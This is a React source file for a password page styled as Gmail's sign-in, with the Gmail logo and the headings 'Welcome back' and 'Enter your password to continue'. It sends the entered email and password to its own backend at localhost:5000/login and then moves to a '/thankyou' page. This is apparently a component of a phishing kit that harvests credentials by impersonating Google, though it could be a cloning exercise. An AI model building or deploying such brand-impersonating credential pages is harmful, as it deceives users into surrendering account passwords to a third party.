import React, { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import axios from "axios";
import './password2.css';
import logo from './img/logo.png';

function Password2() {
  const [password, setPassword] = useState("");
  const location = useLocation();
  const navigate = useNavigate();
  const email = location.state?.email;

  const handleLogin = async () => {
    try {
      const res = await axios.post("http://localhost:5000/login", {
        email,
        password
      });

      alert(res.data); 
      navigate("/thankyou");
    } catch (err) {
      if (err.response) {
        alert(err.response.data); 
      } else {
        alert("Server error");
      }
    }
  };

  return (
    <div className="password2-container">
      <div className="password2-card">
        <div className="left">
          <img src={logo} alt="logo" className="logo" />
          <div className="gmail-text">Gmail</div>
          <h2 className="title">Welcome back</h2>
          <p className="subtitle">Enter your password to continue</p>
        </div>

        <div className="right">
          <input
            type="password"
            className="password-input"
            placeholder="Enter password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <button className="next-btn2" onClick={handleLogin}>Next</button>
        </div>
      </div>
    </div>
  );
}

export default Password2;